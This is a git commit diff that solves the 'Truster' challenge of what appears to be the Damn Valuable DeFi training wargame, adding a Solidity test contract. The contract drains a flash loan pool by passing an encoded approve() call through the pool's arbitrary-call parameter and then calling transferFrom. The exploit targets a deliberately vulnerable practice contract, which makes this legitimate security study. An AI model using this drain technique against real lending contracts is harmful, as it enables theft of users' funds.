14f7eb92f24ce08ccc34f39b549d4f116351dbc1
Daniele Filaretti <daniele@veridise.com>
2026-03-24 17:40:30 +0100

    solve challenge 3

--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -6,11 +6,54 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract TrusterExploiter {
+    constructor(
+        TrusterLenderPool pool,
+        DamnValuableToken token,
+        address recovery,
+        uint256 tokensToSteal
+    ) {
+        // 1) let data := encoded call to `approve(recovery, TOKENS_IN_POOL)`
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            tokensToSteal
+        );
+
+        console.log(
+            "allowance(pool -> recovery) =",
+            token.allowance(address(pool), recovery)
+        );
+        // 2) call pool.flashload(0, recovery, token, data)
+        // TODO: print on the console the balance of pool
+        console.log(
+            "pool balance (before loan) =",
+            token.balanceOf(address(pool))
+        );
+
+        pool.flashLoan(0, recovery, address(token), data);
+
+        console.log(
+            "allowance(pool -> recovery) =",
+            token.allowance(address(pool), recovery)
+        );
+
+        console.log(
+            "pool balance (after load) =",
+            token.balanceOf(address(pool))
+        );
+
+        // 3) call token.transferFrom(pool, recovery)
+        token.transferFrom(address(pool), recovery, tokensToSteal);
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +94,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        new TrusterExploiter(pool, token, recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -63,6 +106,10 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
